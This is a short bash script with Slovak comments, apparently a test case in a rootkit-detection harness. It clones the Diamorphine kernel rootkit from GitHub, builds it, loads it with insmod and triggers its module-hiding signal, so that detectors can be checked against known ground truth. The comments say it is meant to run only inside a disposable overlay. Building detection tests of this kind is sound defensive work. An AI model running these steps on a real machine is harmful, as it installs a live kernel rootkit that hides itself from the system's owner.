#!/usr/bin/env bash
# diamorphine.sh - G1: Diamorphine LKM (rootkit na úrovni jadra).
#
# POZOR: toto je SKUTOČNÝ rootkit. Spúšťa sa LEN v overlayi sedenia
# (scripts/session.sh), ktorý sa po behu zahodí. Zdroj sa sťahuje
# z pripnutého commitu a buildí proti headers hosťa.
#
# Požiadavky v hosťovi: git, make, gcc, linux-headers-$(uname -r).
# Nález: sys_call_table (checks a), moduly krížovo (c), skrytý proces
# cez 'diamorphine' ioctl - pozemná pravda pred/po.
set -uo pipefail
set -e

PIN_COMMIT="${DIAMORPHINE_COMMIT:-master}"
HEADERS="linux-headers-$(uname -r)"
DUR="${DUR:-60}"

command -v git >/dev/null || { echo "diamorphine: chyba git (apt_packages: git build-essential $HEADERS)" >&2; exit 2; }

cd /tmp
rm -rf Diamorphine
git clone -q https://github.com/m0nad/Diamorphine
cd Diamorphine
git checkout -q "$PIN_COMMIT"
echo "diamorphine: commit $(git rev-parse HEAD) (${PIN_COMMIT})"
make >/tmp/diamorphine_build.log 2>&1
echo "diamorphine: build ok (commit $PIN_COMMIT), insmod diamorphine.ko"
insmod diamorphine.ko
echo "diamorphine: nahodny modul -> 'hacked' (schovaj ho)"
kill -31 0 2>/dev/null || true
echo "diamorphine: bezi ${DUR}s - pozemna pravda po behu musi vidiet modul v pamati"
sleep "$DUR"
echo "diamorphine: koniec"
